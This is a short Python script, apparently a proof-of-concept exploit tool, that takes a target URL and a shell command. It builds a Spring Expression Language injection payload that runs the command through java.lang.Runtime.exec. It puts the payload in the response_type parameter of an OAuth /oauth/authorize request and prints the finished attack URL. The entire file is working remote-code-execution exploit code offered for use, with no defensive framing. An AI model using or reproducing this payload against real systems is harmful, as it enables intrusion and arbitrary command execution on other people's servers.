#!/usr/bin/env python3
# writer: yuej0nj1an

url = input("enter your root url: ")
cmd = input('Enter your cmd: ')
poc = '${T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(cmd[0])
for ch in cmd[1:]:
   poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch)
poc += ')}'
poc_url = url + '/oauth/authorize?response_type=' + poc + '&client_id=acme&scope=openid&redirect_uri=http://test'
print("[info] 漏洞uri为： "+ poc_url)